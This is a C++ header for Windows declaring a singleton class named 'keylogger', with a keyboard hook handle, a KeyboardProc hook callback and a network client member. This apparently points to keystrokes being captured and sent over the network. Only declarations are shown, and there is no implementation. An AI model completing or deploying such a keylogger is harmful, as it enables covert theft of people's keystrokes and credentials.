#pragma once

#ifdef _WIN32
#define _WIN32_WINNT 0x0A00
#endif

#include "WinSock2.h"
#include <iostream>
#include <Windows.h>
#include <fstream>
#include "kqnet.h"
#include "common.h"

class keylogger
{
public:
    
    static keylogger& GetInstance();


private:
    keylogger();

    ~keylogger();
    static HHOOK hook;

    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
    
    kq::client_interface<messageType> client;
};